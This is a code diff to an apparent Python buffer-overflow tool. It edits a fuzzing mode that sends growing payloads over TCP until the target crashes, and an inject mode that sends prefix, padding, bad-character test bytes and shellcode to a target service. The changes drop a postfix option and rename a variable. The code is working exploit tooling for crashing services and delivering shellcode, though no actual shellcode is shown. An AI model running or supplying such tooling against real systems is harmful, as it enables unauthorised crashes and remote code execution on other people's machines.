@@ -78,7 +78,7 @@ def test_connection(target_ip, target_port):
     k.close()
 
 
-def spike_fuzz_mode(target_ip, target_port, mode, prefix, prefill, step, postfix):
+def spike_fuzz_mode(target_ip, target_port, mode, prefix, prefill, step):
     # spike and fuzz modes
 
     # standard step size for fuzz
@@ -93,7 +93,7 @@ def spike_fuzz_mode(target_ip, target_port, mode, prefix, prefill, step, postfix
         mult = 1
 
     # the smaller the step, the higher is accuracy
-    buffer = prefix + prefill
+    payload = prefix + prefill
 
     while True:
         try:
@@ -103,24 +103,23 @@ def spike_fuzz_mode(target_ip, target_port, mode, prefix, prefill, step, postfix
                 s.connect((target_ip, target_port))
 
                 # send information as bytes
-                #s.sendall(buffer + bytes("\n\r", "latin-1"))
-                s.send(buffer + bytes("\n\r", "latin-1"))
+                s.sendall(payload + bytes("\n\r", "latin-1"))
                 #s.send(bytes(buffer, "latin-1"))
 
                 sleep(1)
-                buffer = buffer + package * mult
-                print("Payload size sent = %d" % (len(buffer) - len(prefix)))
+                payload = payload + package * mult
+                print("Payload size sent = %d" % (len(payload) - len(prefix)))
 
         except KeyboardInterrupt:
             print("Operation aborted. Exiting...")
             sys.exit()
 
         except:
-            print("Overflow at around %d bytes." %(len(buffer) - len(prefix)))
+            print("Overflow at around %d bytes." %(len(payload) - len(prefix)))
             sys.exit(1)
 
 
-def inject_mode(target_ip, target_port, BadChars, prefix, prefill, shellcode, useBadChars, postfix):
+def inject_mode(target_ip, target_port, BadChars, prefix, prefill, shellcode, useBadChars):
 
     timeout = 5
 
@@ -131,7 +130,7 @@ def inject_mode(target_ip, target_port, BadChars, prefix, prefill, shellcode, us
     s.settimeout(timeout)
     s.connect((target_ip, target_port))
 
-    payload = prefix + prefill + BadChars + shellcode + postfix
+    payload = prefix + prefill + BadChars + shellcode
 
     s.sendall(payload + bytes("\n\r", "latin-1"))
 
@@ -159,8 +158,6 @@ def main():
                         help='Step is amount of bytes to use in Fuzzying mode')
     parser.add_argument('-x', '--prefix', default='', type=str,
                         help='prefix can be used at the beginning of each TCP frame to make correct requests')
-    parser.add_argument('-p', '--postfix', default='', type=str,
-                        help='postfix is sometimes needed at the end of the payload: i.e. "\\r\\n"')
     parser.add_argument('-n', '--prefill_num', default=0, type=int,
                         help='Prefill the payload with n bytes after prefix')
     # Prefill with ascii pattern to find exact offset or insert non byte values
